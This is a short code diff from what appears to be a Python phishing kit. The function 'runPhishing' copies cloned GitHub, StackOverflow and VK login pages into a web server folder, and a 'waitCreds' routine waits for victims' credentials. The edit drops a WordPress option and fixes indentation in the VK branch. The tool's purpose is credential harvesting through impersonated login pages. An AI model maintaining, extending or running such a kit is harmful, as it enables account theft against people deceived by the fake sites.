@@ -89,10 +89,8 @@ def runPhishing(social, option2):
         system('cp WebPages/github/*.* Server/www/')
     elif social == 'StackOverflow':
         system('cp WebPages/stackoverflow/*.* Server/www/')
-    elif social == 'WordPress':
-        system('cp WebPages/wordpress/*.* Server/www/')
-	elif social == 'VK':
-        system('cp WebPages/vk/*.* Server/www/')
+    elif social == 'VK':
+        system('cp WebPages/vk/*.* Server/www/')	
 
 def waitCreds():
     print " {0}[{1}*{0}]{1} Waiting for credentials... \n".format(GREEN, END)
